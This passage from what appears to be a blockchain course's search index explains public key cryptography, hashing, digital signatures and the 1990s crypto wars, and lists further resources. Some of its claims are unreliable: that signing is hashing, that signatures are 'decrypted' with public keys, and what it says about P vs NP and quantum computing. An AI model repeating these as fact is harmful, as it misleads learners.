The cryptographic and distributed computing tools you'll learn in this section are used in every facet of digital life. Online banking, communication networks, cloud providers, aerospace engineering and many more fields pull from similar starting points. By learning them here, you'll better your understanding of those systems, too.","title":"Fundamentals"},{"location":"S01-fundamentals/M0-intro/#the-argument-for-blockchain","text":"","title":"The Argument for Blockchain"},{"location":"S01-fundamentals/M0-intro/#the-current-state-of-affairs","text":"In our financial transactions, we always use an intermediary, be it a bank or a credit card company. We use these institutions because they have cultivated and embodied in society our values of trust, security, and accessibility (You can call someone if you have a problem, there\u2019s a central website, for example)","title":"The Current State of Affairs"},{"location":"S01-fundamentals/M0-intro/#whats-the-problem","text":"However, in recent years, those values have been violated in different ways (financial crashes, data breaches, or monopolization leading to poor customer service), which has led people to question whether there's a different way these processes can be done . At the same time, there's been an unprecedented amount of digitalization that has also occurred in all parts of our life, but also finance\u2013 it's not unusual to cash a check by phone, or pay off a credit card or utility bill by computer.","title":"What's the Problem?"},{"location":"S01-fundamentals/M0-intro/#whats-the-proposed-solution","text":"Significant system failures and increased digitalization led blockchain developers to consider alternatives to centralized financial institutions. Specifically, they looked to develop a protocol for financial transactions. A protocol is the reason why, when you dial a phone number, there's not an operator on the other end connecting your line to another. Or, when you type in a web address, you don't first leave your house to get that data. These are protocols that have been developed which have eliminated intermediate, human-mediated steps. This is the value proposition of blockchain. A peer-to-peer protocol which allows people to interact directly with each other, rather than going through a third party. People are so excited about blockchain because it aims to make important transactions (financial transactions or identity confirmation) peer-to-peer, removing the need for a middle player. Services such as Twilio have automated text message and receiving by allowing programmers to simply import the Twilio library into their program and, presto! They can send and receive text messages. Blockchain protocols such as Ethereum can be seen in a similar light \u2013 import Ethereum libraries (such as web3.js) and you can begin programmatically sending and receiving money. Setting up a bank account takes weeks, but with Ethereum, you can setup accounts, transfer funds and much more all from within your program. The Ethereum protocol is strong enough to sustain financial transactions, but it can also support much more. You can use the distributed network to host self-executing programs. You can build decentralized systems of reputation, you can also persist global state in a secure, trustless way. All of these things are possible within the world of Ethereum.","title":"What's the Proposed Solution?"},{"location":"S01-fundamentals/M0-intro/#what-makes-up-a-protocol","text":"In the following modules, we're going to examine the elements engineers have used to build the peer-to-peer blockchain protocol. We'll then see how systems like Bitcoin and Ethereum join these separate elements together to make a wholly new product: blockchain. Last, we'll talk about the development of Bitcoin and how you can start playing with the Ethereum blockchain right from your browser.","title":"What Makes Up a Protocol?"},{"location":"S01-fundamentals/M1-cryptography/L1-pub-key-crypto/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L1-pub-key-crypto/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M1-cryptography/L2-pub-key-crypto-additional/","text":"Public Key Cryptography Public key cryptography is powerful in general because it is one of the few things on the planet that can create an asymmetric power imbalance. This means that, even if the largest corporation or government were to focus every available resource into figuring out a certain individual's private key, they will not be able to do it. Isn't that crazy!? This asymmetric power imbalance is so dramatic that in the 1990s, world governments fought against the use of public key cryptography. The argument was, because public key cryptography essentially cannot be broken, it represented a critical threat to the national security of governments like the United States. We'll discuss this history more in a following section, but know that at one point using this technology was almost illegal! Public key cryptography is powerful for blockchain specifically because it allows us to prove a message has been sent from a certain person holding a specific private key. This is a step in the direction of establishing identity in a peer-to-peer way. Remember, a blockchain protocol is trying to provide what banks or governments have previously provided but without those institutions as intermediaries. What public key cryptography does is mathematically prove a certain person holds a certain key. Consequences However, there's a big issue here. There's no way to determine who holds the key, just if they have the key. We are assuming the private key equals the owner of the assets, but what if someone steals your private key? This is a big security and user-experience issue for people coming into the blockchain and cryptocurrency world. As consumers, users are probably used to being able to reset their passwords, recover their funds if there's fraud, or at least reach out to a service and get assistance in case of trouble. At its most basic, with users handling their own private keys, almost all of this disappears. Even more troubling, regardless of the amount of messaging a user receives about protecting their private keys, many may not understand there is no safety net until it is too late. And for those users who are experienced, there are so many bad habits we've all developed as consumers which are hard to break. All this to say: Not trusting is expensive. Please be aware of how expensive it is, not only for yourself, but also for your users. Luckily, at the end of this section, we'll walk through some basic security considerations that anyone in the crypto space should adopt from Day 1 Okay! Parental lecture over, stepping off of soapbox, and now time to play with some public keys cryptography! Moar on Keys There are a ton of additional resources for public key cryptography, so we're going to break them up into different sections: General Public Key Cryptography Resources , Blockchain / Ethereum-Specific Public Key Cryptography Resources and Advanced Public Key Cryptography Resources . General Public Key Cryptography Resources Know that in these examples, you will meet some lifetime friends, Alice and Bob. They are the most absolutely unimaginatively, Eurocentric named parties in every cryptographic key exchange (rather than using A and B). Please, please if you're ever teaching this to someone else use a more interesting name than Alice and Bob, like Akash and Basilia. But, it is the common way to discuss it and perhaps there's value in that commonality across cultures. Video & Interactive Code: ETH.Building with Key Pairs Excellent hands-on tutorial about public keypairs from Austin Griffith using his ETH.Build platform (highly recommended) Article: Public Key Cryptography (Wikipedia) A good starting place for folks to get an understanding of the terms and be able to dig into some of the background or deeper ideas. Video: End to End Encryption \u2014 Computerphile Introducing the general concepts behind using encryption in public networks Video: Gambling with Secrets \u2014 RSA Encryption Article: What is Asymmetric Encryption? Article: Keeping Secrets Secret (BBC) This is a valuable resource explaining, in simple visual terms, the modular arithmetic underpinning the security of public key cryptography, hashing (which we'll learn about next) and any other one-way or \"trapdoor\" functions. It illustrates how you cannot break a private key's encryption with brute-force but can easily validate it if you have the accompanying public key. Video: Secret Key Exchange \u2014 Computerphile Not public key encryption but good to know in terms of general cryptography mechanics Video: Elliptic Curves \u2014 Computerphile Going deeper into the Elliptic Curve encryption behind public key cryptography. Mini-Course: Basic Key Exchange Requires a free Coursera registration, but this is another general overview on the mechanics of key exchanges (not RSA encryption specifically) from Dan Boneh's Cryptography I course from Stanford University. Blockchain / Ethereum-Specific Public Key Cryptography Resources Now that you have an understanding of public key cryptography generally, let's dive into how it is used in blockchains, specifically Ethereum. The following links will mainly show how private keys are used to generate Ethereum accounts, which then become a stand-in for identity on the Ethereum network. Note that all Ethereum addresses start with the first two characters 0x , which is not actually part of the address but rather a prefix used to let programs know the address is coded in hexadecimal format. Book Excerpt: Keys and Addresses (Mastering Ethereum) Excerpt from Andreas Antonopoulos and Gavin Wood's excellent book, Mastering Ethereum available for free as an e-book through this GitHub repo. Article: How are Ethereum Addresses Generated? (Stack Overflow) A nice, thorough answer walking through the process of generating a private key to having an Ethereum address linked to that private key Advanced Public Key Cryptography Resources Coding Problem Set: Cryptopals This is an extremely advanced problem set series discussing applied cryptography generally. Not for the faint of heart!","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L2-pub-key-crypto-additional/#public-key-cryptography","text":"Public key cryptography is powerful in general because it is one of the few things on the planet that can create an asymmetric power imbalance. This means that, even if the largest corporation or government were to focus every available resource into figuring out a certain individual's private key, they will not be able to do it. Isn't that crazy!? This asymmetric power imbalance is so dramatic that in the 1990s, world governments fought against the use of public key cryptography. The argument was, because public key cryptography essentially cannot be broken, it represented a critical threat to the national security of governments like the United States. We'll discuss this history more in a following section, but know that at one point using this technology was almost illegal! Public key cryptography is powerful for blockchain specifically because it allows us to prove a message has been sent from a certain person holding a specific private key. This is a step in the direction of establishing identity in a peer-to-peer way. Remember, a blockchain protocol is trying to provide what banks or governments have previously provided but without those institutions as intermediaries. What public key cryptography does is mathematically prove a certain person holds a certain key.","title":"Public Key Cryptography"},{"location":"S01-fundamentals/M1-cryptography/L2-pub-key-crypto-additional/#consequences","text":"However, there's a big issue here. There's no way to determine who holds the key, just if they have the key. We are assuming the private key equals the owner of the assets, but what if someone steals your private key? This is a big security and user-experience issue for people coming into the blockchain and cryptocurrency world. As consumers, users are probably used to being able to reset their passwords, recover their funds if there's fraud, or at least reach out to a service and get assistance in case of trouble. At its most basic, with users handling their own private keys, almost all of this disappears. Even more troubling, regardless of the amount of messaging a user receives about protecting their private keys, many may not understand there is no safety net until it is too late. And for those users who are experienced, there are so many bad habits we've all developed as consumers which are hard to break. All this to say: Not trusting is expensive. Please be aware of how expensive it is, not only for yourself, but also for your users. Luckily, at the end of this section, we'll walk through some basic security considerations that anyone in the crypto space should adopt from Day 1 Okay! Parental lecture over, stepping off of soapbox, and now time to play with some public keys cryptography!","title":"Consequences"},{"location":"S01-fundamentals/M1-cryptography/L2-pub-key-crypto-additional/#moar-on-keys","text":"There are a ton of additional resources for public key cryptography, so we're going to break them up into different sections: General Public Key Cryptography Resources , Blockchain / Ethereum-Specific Public Key Cryptography Resources and Advanced Public Key Cryptography Resources .","title":"Moar on Keys"},{"location":"S01-fundamentals/M1-cryptography/L2-pub-key-crypto-additional/#general-public-key-cryptography-resources","text":"Know that in these examples, you will meet some lifetime friends, Alice and Bob. They are the most absolutely unimaginatively, Eurocentric named parties in every cryptographic key exchange (rather than using A and B). Please, please if you're ever teaching this to someone else use a more interesting name than Alice and Bob, like Akash and Basilia. But, it is the common way to discuss it and perhaps there's value in that commonality across cultures. Video & Interactive Code: ETH.Building with Key Pairs Excellent hands-on tutorial about public keypairs from Austin Griffith using his ETH.Build platform (highly recommended) Article: Public Key Cryptography (Wikipedia) A good starting place for folks to get an understanding of the terms and be able to dig into some of the background or deeper ideas. Video: End to End Encryption \u2014 Computerphile Introducing the general concepts behind using encryption in public networks Video: Gambling with Secrets \u2014 RSA Encryption Article: What is Asymmetric Encryption? Article: Keeping Secrets Secret (BBC) This is a valuable resource explaining, in simple visual terms, the modular arithmetic underpinning the security of public key cryptography, hashing (which we'll learn about next) and any other one-way or \"trapdoor\" functions. It illustrates how you cannot break a private key's encryption with brute-force but can easily validate it if you have the accompanying public key. Video: Secret Key Exchange \u2014 Computerphile Not public key encryption but good to know in terms of general cryptography mechanics Video: Elliptic Curves \u2014 Computerphile Going deeper into the Elliptic Curve encryption behind public key cryptography. Mini-Course: Basic Key Exchange Requires a free Coursera registration, but this is another general overview on the mechanics of key exchanges (not RSA encryption specifically) from Dan Boneh's Cryptography I course from Stanford University.","title":"General Public Key Cryptography Resources"},{"location":"S01-fundamentals/M1-cryptography/L2-pub-key-crypto-additional/#blockchain-ethereum-specific-public-key-cryptography-resources","text":"Now that you have an understanding of public key cryptography generally, let's dive into how it is used in blockchains, specifically Ethereum. The following links will mainly show how private keys are used to generate Ethereum accounts, which then become a stand-in for identity on the Ethereum network. Note that all Ethereum addresses start with the first two characters 0x , which is not actually part of the address but rather a prefix used to let programs know the address is coded in hexadecimal format. Book Excerpt: Keys and Addresses (Mastering Ethereum) Excerpt from Andreas Antonopoulos and Gavin Wood's excellent book, Mastering Ethereum available for free as an e-book through this GitHub repo. Article: How are Ethereum Addresses Generated? (Stack Overflow) A nice, thorough answer walking through the process of generating a private key to having an Ethereum address linked to that private key","title":"Blockchain / Ethereum-Specific Public Key Cryptography Resources"},{"location":"S01-fundamentals/M1-cryptography/L2-pub-key-crypto-additional/#advanced-public-key-cryptography-resources","text":"Coding Problem Set: Cryptopals This is an extremely advanced problem set series discussing applied cryptography generally. Not for the faint of heart!","title":"Advanced Public Key Cryptography Resources"},{"location":"S01-fundamentals/M1-cryptography/L3-hashing/","text":"Hashing This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L3-hashing/#hashing","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Hashing"},{"location":"S01-fundamentals/M1-cryptography/L4-hashing-additional/","text":"Hashing Cryptographic hash functions (also called hash functions or just hashes ) are essential to us building a decentralized trust protocol by providing three main things (use this cryptographic hash function sandbox to follow along): Uniqueness We can be assured if we put in the string dark wallet puzzle in a cryptographic function, it will always produce the same hash result. With a sufficiently large number of possibilities, this avoids the \u201chash collision\u201d problem, in that we don\u2019t have to worry about two strings getting the same hash. Avalanche Effect Small changes on the target string for a hash function leads to outsized effects. Change one letter in the string you hashed in the above example, maybe capitalizing the \"d\" in Dark wallet puzzle . You'll see it\u2019s not changed a little bit but a lot. This illustrates the second characteristic of a good hashing function \u2014 \u201cThe Avalanche Effect\u201d. This says a single change in the string will cause a successive series of changes that compound each other. Speed Cryptographic hash functions can also run incredibly fast with little overhead and still maintain their security. This is more of a logistical concern. The hashing function can\u2019t be too slow, otherwise it causes delays. But it also can\u2019t be too fast or it will be easier to find collisions. It needs to be fast for processing but slow for hacking. Cryptographic hash functions speed combined with the difficulty in deriving the target input makes them a one-way or \"trapdoor\" function \u2014 easy to go one way, near impossible to go the other. These three characteristics combine to help blockchains provide decentralized file integrity. Let's explain how. Hashing in Blockchains In the Bitcoin Whitepaper, Satoshi Nakamoto articulates the \"double-spend\" problem facing digital currencies: The problem of course is the payee can't verify that one of the owners did not double-spend the coin. A common solution is to introduce a trusted central authority, or mint, that checks every transaction for double spending. After each transaction, the coin must be returned to the mint to issue a new coin, and only coins issued directly from the mint are trusted not to be double-spent. The problem with this solution is that the fate of the entire money system depends on the company running the mint, with every transaction having to go through them, just like a bank. We need a way for the payee to know that the previous owners did not sign any earlier transactions. For our purposes, the earliest transaction is the one that counts, so we don't care about later attempts to double-spend. The only way to confirm the absence of a transaction is to be aware of all transactions. In the mint based model, the mint was aware of all transactions and decided which arrived first. To accomplish this without a trusted party, transactions must be publicly announced [1], and we need a system for participants to agree on a single history of the order in which they were received. The payee needs proof that at the time of each transaction, the majority of nodes agreed it was the first received. To restate the problem: How do we know the transaction record is true and hasn't been tampered with? Hashing helps us with this. (The second point, proof of majority node agreement, we'll cover in the next Module on Distributed Consensus) Nakamoto proposes using hashing to create what they call a \"Timestamp Server\": The solution we propose begins with a timestamp server. A timestamp server works by taking a hash of a block of items to be timestamped and widely publishing the hash , such as in a newspaper or Usenet post [2-5]. The timestamp proves that the data must have existed at the time, obviously, in order to get into the hash. Each timestamp includes the previous timestamp in its hash, forming a chain, with each additional timestamp reinforcing the ones before it. from the Bitcoin Whitepaper The timestamp server leverages hash functions in one critical way. It includes the hash of the previous block into the hash of the current block. If any historical data in any of the previous blocks are altered, the changes will cascade throughout all the blocks after it. In this way, blocks of transaction data are chained together to form a blockchain \ud83e\udd2f \ud83e\udd2f \ud83e\udd2f. This chaining can only be effective in a large system because of those three characteristics of hash functions we discussed previously: Uniqueness (one string matches one hash), Avalanche Effects (one change in an input string creates outsized effects on the output) and Speed (hashes can be securely computed quickly at scale). Hash Chains as General Data Structures While Nakamoto's timestamp server uses hash chains, hash chains are found in many different sorts of computer science applications before and beyond blockchain. The version control software Git, for example, uses a hash chain, also called a Directed Acyclic Graph, to track changes of software over time. Challenge-Response schemes, used for user validation, also use the concept of a hash chain. Learning about hash functions and the associated hash chaining will give you great insights into these power data structures as well as programming data primitives like hash tables. Additional Links for Hashing ### General Hashing Material Interactive Code: Cryptographic Hash Function Sandbox A, simple nice way to see the characteristics of hash functions. Article: Why is 2^256 Secure? Explanation behind the enormous \"numberspace\" that virtually guarantees no collisions, and therefore uniqueness, when using hash functions based on large exponents. Video: Hashing Algorithms and Security (Computerphile) Video: SHA (Secure Hashing Algorithm) Explained (Computerphile) Article: How Hash Algorithms Work Article: Cryptographic Hash Function (Simple Wikipedia) Blockchain / Ethereum-Specific Hashing Material Interactive Code: ETH.Build Austin Griffith walks through Hash Functions using his ETH.Build platform (highly recommended). Article: Blockchain Underpinnings: Hashing (ConsenSys) Interactive Code: Cryptographic Hash Functions (ConsenSys / Josh Crites) Uses a platform called Observable to provide you with code you can run in the article! Lesson: Cryptographic Hash Functions (Khan Academy) Advanced Hashing Resources Coding: Bitcoin Whitepaper Exercises: Hashing This is a JavaScript-based exercise implementing the timestamp server outlined in the Bitcoin Whitepaper. It's the first in a larger problem set we'll also recommend you try later in this section.","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L4-hashing-additional/#hashing","text":"Cryptographic hash functions (also called hash functions or just hashes ) are essential to us building a decentralized trust protocol by providing three main things (use this cryptographic hash function sandbox to follow along): Uniqueness We can be assured if we put in the string dark wallet puzzle in a cryptographic function, it will always produce the same hash result. With a sufficiently large number of possibilities, this avoids the \u201chash collision\u201d problem, in that we don\u2019t have to worry about two strings getting the same hash. Avalanche Effect Small changes on the target string for a hash function leads to outsized effects. Change one letter in the string you hashed in the above example, maybe capitalizing the \"d\" in Dark wallet puzzle . You'll see it\u2019s not changed a little bit but a lot. This illustrates the second characteristic of a good hashing function \u2014 \u201cThe Avalanche Effect\u201d. This says a single change in the string will cause a successive series of changes that compound each other. Speed Cryptographic hash functions can also run incredibly fast with little overhead and still maintain their security. This is more of a logistical concern. The hashing function can\u2019t be too slow, otherwise it causes delays. But it also can\u2019t be too fast or it will be easier to find collisions. It needs to be fast for processing but slow for hacking. Cryptographic hash functions speed combined with the difficulty in deriving the target input makes them a one-way or \"trapdoor\" function \u2014 easy to go one way, near impossible to go the other. These three characteristics combine to help blockchains provide decentralized file integrity. Let's explain how.","title":"Hashing"},{"location":"S01-fundamentals/M1-cryptography/L4-hashing-additional/#hashing-in-blockchains","text":"In the Bitcoin Whitepaper, Satoshi Nakamoto articulates the \"double-spend\" problem facing digital currencies: The problem of course is the payee can't verify that one of the owners did not double-spend the coin. A common solution is to introduce a trusted central authority, or mint, that checks every transaction for double spending. After each transaction, the coin must be returned to the mint to issue a new coin, and only coins issued directly from the mint are trusted not to be double-spent. The problem with this solution is that the fate of the entire money system depends on the company running the mint, with every transaction having to go through them, just like a bank. We need a way for the payee to know that the previous owners did not sign any earlier transactions. For our purposes, the earliest transaction is the one that counts, so we don't care about later attempts to double-spend. The only way to confirm the absence of a transaction is to be aware of all transactions. In the mint based model, the mint was aware of all transactions and decided which arrived first. To accomplish this without a trusted party, transactions must be publicly announced [1], and we need a system for participants to agree on a single history of the order in which they were received. The payee needs proof that at the time of each transaction, the majority of nodes agreed it was the first received. To restate the problem: How do we know the transaction record is true and hasn't been tampered with? Hashing helps us with this. (The second point, proof of majority node agreement, we'll cover in the next Module on Distributed Consensus) Nakamoto proposes using hashing to create what they call a \"Timestamp Server\": The solution we propose begins with a timestamp server. A timestamp server works by taking a hash of a block of items to be timestamped and widely publishing the hash , such as in a newspaper or Usenet post [2-5]. The timestamp proves that the data must have existed at the time, obviously, in order to get into the hash. Each timestamp includes the previous timestamp in its hash, forming a chain, with each additional timestamp reinforcing the ones before it. from the Bitcoin Whitepaper The timestamp server leverages hash functions in one critical way. It includes the hash of the previous block into the hash of the current block. If any historical data in any of the previous blocks are altered, the changes will cascade throughout all the blocks after it. In this way, blocks of transaction data are chained together to form a blockchain \ud83e\udd2f \ud83e\udd2f \ud83e\udd2f. This chaining can only be effective in a large system because of those three characteristics of hash functions we discussed previously: Uniqueness (one string matches one hash), Avalanche Effects (one change in an input string creates outsized effects on the output) and Speed (hashes can be securely computed quickly at scale).","title":"Hashing in Blockchains"},{"location":"S01-fundamentals/M1-cryptography/L4-hashing-additional/#hash-chains-as-general-data-structures","text":"While Nakamoto's timestamp server uses hash chains, hash chains are found in many different sorts of computer science applications before and beyond blockchain. The version control software Git, for example, uses a hash chain, also called a Directed Acyclic Graph, to track changes of software over time. Challenge-Response schemes, used for user validation, also use the concept of a hash chain. Learning about hash functions and the associated hash chaining will give you great insights into these power data structures as well as programming data primitives like hash tables.","title":"Hash Chains as General Data Structures"},{"location":"S01-fundamentals/M1-cryptography/L4-hashing-additional/#additional-links-for-hashing","text":"### General Hashing Material Interactive Code: Cryptographic Hash Function Sandbox A, simple nice way to see the characteristics of hash functions. Article: Why is 2^256 Secure? Explanation behind the enormous \"numberspace\" that virtually guarantees no collisions, and therefore uniqueness, when using hash functions based on large exponents. Video: Hashing Algorithms and Security (Computerphile) Video: SHA (Secure Hashing Algorithm) Explained (Computerphile) Article: How Hash Algorithms Work Article: Cryptographic Hash Function (Simple Wikipedia)","title":"Additional Links for Hashing"},{"location":"S01-fundamentals/M1-cryptography/L4-hashing-additional/#blockchain-ethereum-specific-hashing-material","text":"Interactive Code: ETH.Build Austin Griffith walks through Hash Functions using his ETH.Build platform (highly recommended). Article: Blockchain Underpinnings: Hashing (ConsenSys) Interactive Code: Cryptographic Hash Functions (ConsenSys / Josh Crites) Uses a platform called Observable to provide you with code you can run in the article! Lesson: Cryptographic Hash Functions (Khan Academy)","title":"Blockchain / Ethereum-Specific Hashing Material"},{"location":"S01-fundamentals/M1-cryptography/L4-hashing-additional/#advanced-hashing-resources","text":"Coding: Bitcoin Whitepaper Exercises: Hashing This is a JavaScript-based exercise implementing the timestamp server outlined in the Bitcoin Whitepaper. It's the first in a larger problem set we'll also recommend you try later in this section.","title":"Advanced Hashing Resources"},{"location":"S01-fundamentals/M1-cryptography/L5-digital-sig/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L5-digital-sig/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M1-cryptography/L6-digital-sig-additional/","text":"Digital Signatures Up till now, we've looked at how blockchains use private keys as a decentralized form of identity and how hashing is used as a decentralized form of file integrity. We are now arriving at the last cryptographic element of our decentralized trust protocol, digital signatures. As the previous section discussed, digital signatures use a combination of the key signing and hashing to create what we're calling decentralized intent. Let's unpack what that means. In blockchain, the signature is made when a hash of the message is signed by the private key of the account holder. (The encryption process is also a hashing process, so it may be helpful to think of the signed transaction as a hash of a hash.) In practice, it looks like a normal hash except it can be decrypted using the sender's public key to confirm identity. This digital signature acts like a protective wrapping around transaction data, as the simplified image below shows: a signed blockchain transaction (simplified) The first, unsigned hash is formed by making a cryptographic hash of the Sender , Receiver and Amount data. The second, signed hash is formed by combining the Sender Receiver Amount and, most importantly, Hash data and signing all those fields. By creating these two successive hashes, we are creating a series of protective wrappings. A message that has a valid digital signature on it provides three different confirmations. It confirms: * Origin: From what we learned about public key cryptography, we can infer that if a private key digital signature is valid then the signed message really did come from the account associated with the public key. * Message Integrity: From what we learned about cryptographic hash functions, we know that the message has not been tampered with by anyone else * Intent: By signing the first hash, the owner of the private key is signalling their intent to execute whatever commands or agreements are contained in the message. In the non-blockchain world, the idea of capturing intent may seem fairly useless since you can't legally force someone to do something they do not want to do. Someone can sign a string saying, \"I'll pay you 100 pounds\" but you can't really do anything with that string. It's just pixels on a screen. The real power of digital signatures comes when the message within that digital signature can be executed, say on a blockchain protocol. In fact, the only significant messages in the blockchain world are bits of code that, when signed and validated, can be executed automatically by the blockchain protocol. (If this feels like a leap for you, that's okay, we're going to keep explaining it more.) Conclusion The decentralization of intent is the last piece of cryptographic primitives in this section. It's important for capturing intent but it's also significant because it relies entirely on two other primitives (public key cryptography and hash functions) for its existence. Digital signatures are emergent in this way, arising from simple-yet-powerful features to create something with equal importance. It's a good microcosm or analogy for the broader ecosystem and yet another example of emergence. Additional Resources Article: The Magic of Digital Signatures (MyCrypto)","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L6-digital-sig-additional/#digital-signatures","text":"Up till now, we've looked at how blockchains use private keys as a decentralized form of identity and how hashing is used as a decentralized form of file integrity. We are now arriving at the last cryptographic element of our decentralized trust protocol, digital signatures. As the previous section discussed, digital signatures use a combination of the key signing and hashing to create what we're calling decentralized intent. Let's unpack what that means. In blockchain, the signature is made when a hash of the message is signed by the private key of the account holder. (The encryption process is also a hashing process, so it may be helpful to think of the signed transaction as a hash of a hash.) In practice, it looks like a normal hash except it can be decrypted using the sender's public key to confirm identity. This digital signature acts like a protective wrapping around transaction data, as the simplified image below shows: a signed blockchain transaction (simplified) The first, unsigned hash is formed by making a cryptographic hash of the Sender , Receiver and Amount data. The second, signed hash is formed by combining the Sender Receiver Amount and, most importantly, Hash data and signing all those fields. By creating these two successive hashes, we are creating a series of protective wrappings. A message that has a valid digital signature on it provides three different confirmations. It confirms: * Origin: From what we learned about public key cryptography, we can infer that if a private key digital signature is valid then the signed message really did come from the account associated with the public key. * Message Integrity: From what we learned about cryptographic hash functions, we know that the message has not been tampered with by anyone else * Intent: By signing the first hash, the owner of the private key is signalling their intent to execute whatever commands or agreements are contained in the message. In the non-blockchain world, the idea of capturing intent may seem fairly useless since you can't legally force someone to do something they do not want to do. Someone can sign a string saying, \"I'll pay you 100 pounds\" but you can't really do anything with that string. It's just pixels on a screen. The real power of digital signatures comes when the message within that digital signature can be executed, say on a blockchain protocol. In fact, the only significant messages in the blockchain world are bits of code that, when signed and validated, can be executed automatically by the blockchain protocol. (If this feels like a leap for you, that's okay, we're going to keep explaining it more.)","title":"Digital Signatures"},{"location":"S01-fundamentals/M1-cryptography/L6-digital-sig-additional/#conclusion","text":"The decentralization of intent is the last piece of cryptographic primitives in this section. It's important for capturing intent but it's also significant because it relies entirely on two other primitives (public key cryptography and hash functions) for its existence. Digital signatures are emergent in this way, arising from simple-yet-powerful features to create something with equal importance. It's a good microcosm or analogy for the broader ecosystem and yet another example of emergence.","title":"Conclusion"},{"location":"S01-fundamentals/M1-cryptography/L6-digital-sig-additional/#additional-resources","text":"Article: The Magic of Digital Signatures (MyCrypto)","title":"Additional Resources"},{"location":"S01-fundamentals/M1-cryptography/L7-crypto-fundamentals-playground/","text":"Cryptography Fundamentals Playground If you've gotten this far, you've learned the basic cryptographic fundamentals underpinning blockchain generally. We still need to learn about decentralized consensus, and we'll do that in the next module, but we wanted to let you interact with public key cryptography, hash functions and digital signing in a tangible way. We'll have a live presentation where we walk through playing with cryptographic keys and generating accounts. In the meantime, please check out the resources below. These are advanced exercises, but we hope you will at least take a look. If these look too intense, that's also okay. Additional Resources (Advanced) Bitcoin White Paper Exercises These are a series of exercises, built by Kyle Simpson, for understanding some of the concepts outlined in the Bitcoin white paper. These are not easy, but if you really would like to understand these fundamentals as they apply to blockchains, this is a great place to start. CryptoHack \"A fun free platform for learning modern cryptography\" Hack the Box A gamified, cybersecurity platform. Not cryptography, per se, but cyber security which is a related field. CryptoPals This is very advanced and intense, but real to-the-metal applied cryptography! I am putting this link in here and it scares me.","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L7-crypto-fundamentals-playground/#cryptography-fundamentals-playground","text":"If you've gotten this far, you've learned the basic cryptographic fundamentals underpinning blockchain generally. We still need to learn about decentralized consensus, and we'll do that in the next module, but we wanted to let you interact with public key cryptography, hash functions and digital signing in a tangible way. We'll have a live presentation where we walk through playing with cryptographic keys and generating accounts. In the meantime, please check out the resources below. These are advanced exercises, but we hope you will at least take a look. If these look too intense, that's also okay.","title":"Cryptography Fundamentals Playground"},{"location":"S01-fundamentals/M1-cryptography/L7-crypto-fundamentals-playground/#additional-resources-advanced","text":"Bitcoin White Paper Exercises These are a series of exercises, built by Kyle Simpson, for understanding some of the concepts outlined in the Bitcoin white paper. These are not easy, but if you really would like to understand these fundamentals as they apply to blockchains, this is a great place to start. CryptoHack \"A fun free platform for learning modern cryptography\" Hack the Box A gamified, cybersecurity platform. Not cryptography, per se, but cyber security which is a related field. CryptoPals This is very advanced and intense, but real to-the-metal applied cryptography! I am putting this link in here and it scares me.","title":"Additional Resources (Advanced)"},{"location":"S01-fundamentals/M1-cryptography/L7a-eth-101/","text":"Currently on LMS This content is an iframe embedded on courses.consensys.net (for now)","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L7a-eth-101/#currently-on-lms","text":"This content is an iframe embedded on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S01-fundamentals/M1-cryptography/L8-crypto-wars-history/","text":"History of the Crypto Wars From the opening of Cory Doctorow's video (also in the next section): Back in the late 90s, the NSA [US National Security Agency] classed cryptography as a munition and imposed strict limits on civilian access to strong crypto. They said, \"We can't afford to have the criminals go dark, they're going to hide behind crypto and we won't be able to spy on them.\" In the face of all that resistance, we finally came up with a winning argument. We went to the [US Federal Courts] and said, \"We believe that the first amendment of the US Constitution, which guarantees the right to free speech protects [citizens' access to strong cryptography]. Code is a form of expressive speech in the framework of the US Constitution.\" And this worked. The reason you folks can use [strong cryptography] is because we won this case. As we mentioned previously, asymmetric cryptography presents an enormous challenge to larger structures of power, particularly those tasked with national security. The inability of governments to \"crack\" high-end public key encryption is an unusual position for these institutions. In fact, there are documented attempts of public institutions such as the NSA to create \"backdoors\" into public key cryptography protocols. Crucial to note in these \"backdoor\" attempts is that the math itself behind public key cryptography is not being compromised. What would actually be compromised is the way in which the math is being used by a piece of software. It's the difference between saying a criminal organization has \"hacked\" the Ethereum blockchain protocol (unlikely) versus a criminal organization has \"hacked\" a popular Ethereum software client (less unlikely). It's nearly impossible to build a \"backdoor\" into a concept, like public key cryptography. However, it is possible to compromise a popular piece of software that implements that concept. This is why it is critical that blockchain projects are open-source and very careful about the ways they handle sensitive data for users (like private keys). We'll get into that more when we discuss MetaMask's LavaMoat initiative and general security for working in the blockchain space. Now, we said it's \"nearly impossible\" to build a backdoor into a concept like public key cryptography. The one way in which applied cryptography could be broken is if someone is able to solve what's called the \"P versus NP\" problem ( video explainer ) It's way too complicated to get into now, but essentially if someone could build a machine that defies the traditional physics underlying modern computation it would break our society's cryptographic systems. Theoretically, it's possible this could happen with quantum computers. But, while that technology has made recent advancements, it's far from where it needs to be. Last note, it's highly unlikely (not impossible) quantum computing is being developed secretly by a nation-state as the engineering, resources and conceptual breakthroughs required for its development are considered beyond the capacity of a world government. Exciting times! If you'd like to read more about the Cypherpunk movement, you can read this article from Wired magazine in 1993 ( archived version here ). Additional Links Article: NSA Efforts to Evade Encryption Technology Damaged U.S. Cryptography Standard A piece about the NSA attempts to build a backdoor into cryptographic standards in the 1990s. Article: \"Crypto Rebels\" (Wired, 1993) This is the article Doctorow mentions in his talk providing more description about the events surrounding encryption in the 1990s. Wiki: The Hitchhiker's Guide to Online Anonymity Nervous about privacy from governments? This is an extremely detailed guide to walkthrough how to maintain anonymity online. Spoiler alert: it is quite challenging!","title":"Index"},{"location":"S01-fundamentals/M1-cryptography/L8-crypto-wars-history/#history-of-the-crypto-wars","text":"From the opening of Cory Doctorow's video (also in the next section): Back in the late 